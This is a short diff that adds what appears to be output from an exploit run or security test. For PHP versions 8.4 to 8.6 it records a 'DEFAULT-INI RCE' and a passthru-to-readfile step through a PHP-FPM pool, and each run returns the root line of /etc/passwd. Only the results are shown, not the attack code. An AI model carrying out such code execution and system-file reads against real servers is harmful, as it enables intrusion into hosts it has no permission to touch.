@@ -1,0 +1,15 @@
+8.4 DEFAULT-INI RCE: MARKER_WRITTEN_BY_A
+--- 8.4 WHM passthru->readfile via pool A:
+root:x:0:0:root:/root:/bin/bash
+WHM_DONE
+
+8.5 DEFAULT-INI RCE: MARKER_WRITTEN_BY_A
+--- 8.5 WHM passthru->readfile via pool A:
+root:x:0:0:root:/root:/bin/bash
+WHM_DONE
+
+8.6 DEFAULT-INI RCE: MARKER_WRITTEN_BY_A
+--- 8.6 WHM passthru->readfile via pool A:
+root:x:0:0:root:/root:/bin/bash
+WHM_DONE
+
